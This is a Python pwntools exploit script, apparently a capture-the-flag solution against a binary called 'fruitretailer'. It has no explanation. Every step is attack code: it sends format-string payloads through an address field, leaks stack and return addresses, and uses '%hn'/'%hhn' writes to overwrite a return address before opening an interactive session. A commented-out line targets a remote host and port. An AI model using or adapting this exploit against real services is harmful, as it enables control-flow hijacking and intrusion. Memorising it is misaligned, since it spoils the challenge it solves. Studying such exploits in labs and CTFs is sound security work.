from pwn import *

# Run process
context.arch = 'amd64'
context.terminal = ['tmux','new-window']
context.aslr = None


#r = remote("125.235.240.167",5000)
r = process(['./fruitretailer'])

text = 0x555555554000 

#r = gdb.debug(['./fruitretailer'],
#        """
#        b *%#x
#        b *%#x
#        """ % ((text+0x0000107a),(text+0x00001220))
#)


def buy_fruit(fruit_type,quantity,address):
    r.sendline("1")
    r.sendline(str(fruit_type))
    r.sendline(str(quantity))

    if address:
        r.sendline('Y')
        r.sendline(address)
    else:
        r.sendline('N')


def change_label(index,label):
    r.sendline("3")
    r.sendline(str(index))
    r.sendline(label)


def invoice():
    r.sendline("2")



format_string = "%9$pS%6$p"

buy_fruit(2,9999999999999999999,"A"*0x40+format_string)
change_label(1,"X"*10)


invoice()
r.readuntil("65531|")
ret_addr = r.readuntil("S")[:-1]
stack_addr = r.readuntil("A")[:-1]

new_ret_addr = int(ret_addr,16)+0x7e2-0x1000
new_stack_addr = int(stack_addr,16)+8



payload = 0xff & new_stack_addr
format_string = "%"+str(payload)+"x%6$hhn"
buy_fruit(2,9999999999999999999,"A"*0x40+format_string)
change_label(2,"X"*10)


payload = 0xffff & new_ret_addr
log.info(hex(new_ret_addr))
log.info(hex(payload))
log.info(hex(new_stack_addr))


format_string = "%"+str(payload)+"x%8$hn"
buy_fruit(2,9999999999999999999,"A"*0x40+format_string)
change_label(3,"X"*10)
invoice()

r.interactive()



    
